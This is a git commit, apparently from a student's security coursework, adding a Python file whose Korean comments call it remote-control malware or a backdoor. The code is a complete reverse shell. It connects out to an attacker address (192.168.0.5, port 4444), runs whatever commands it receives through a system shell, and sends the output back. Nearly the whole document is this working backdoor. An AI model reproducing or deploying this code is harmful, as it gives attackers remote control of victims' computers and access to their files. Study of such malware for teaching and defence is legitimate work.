db6cf2e176fb2c5715cc8e25cb3421228bcdebf9
Junhyuk Choi <jchoi138@student.solbridge.ac.kr>
2022-04-11 23:08:38 +0900

    소켓을이용한원격제어악성코드제작

---
+++ src/ch_4/소켓을이용한원격제어악성코드제작_2(4-9).py
@@ -0,0 +1,52 @@
+# client
+# 클라이언트가 서버로 연결을 시도하는 코드
+# 즉 피해자가 공격자 측으로 연결을 시도하는 악성코드 또는 백도어라고 볼 수 있다.
+import socket
+import subprocess
+import os
+
+
+def set_sock(ip, port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.connect((ip, port))
+    return s
+
+
+def connect_cnc(s):
+    while True:
+        cwd = os.getcwd()
+        command = s.recv(65535).decode().lower()
+        if command == "exit":
+            s.close()
+            break
+        elif command == "pwd":
+            s.send(cwd.encode("utf-8"))
+            continue
+
+        try:
+            if command.startswith("cd"):
+                os.chdir(command[3:].replace("\n", ""))
+                command = ""
+                cwd = os.getcwd()
+                s.send(cwd.encode("euc-kr"))
+                continue
+        except Exception as e:
+            s.send(str(e).encode("euc-kr", "ignore"))
+
+        proc = subprocess.Popen(
+            command,
+            shell=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            stdin=subprocess.PIPE,
+        )
+        output = proc.stdout.read() + proc.stderr.read()
+        s.send(output)
+
+
+if __name__ == "__main__":
+    ip = "192.168.0.5"  # 연결할 공격자의 아이피 주소
+    port = 4444
+    s = set_sock(ip, port)
+    connect_cnc(s)
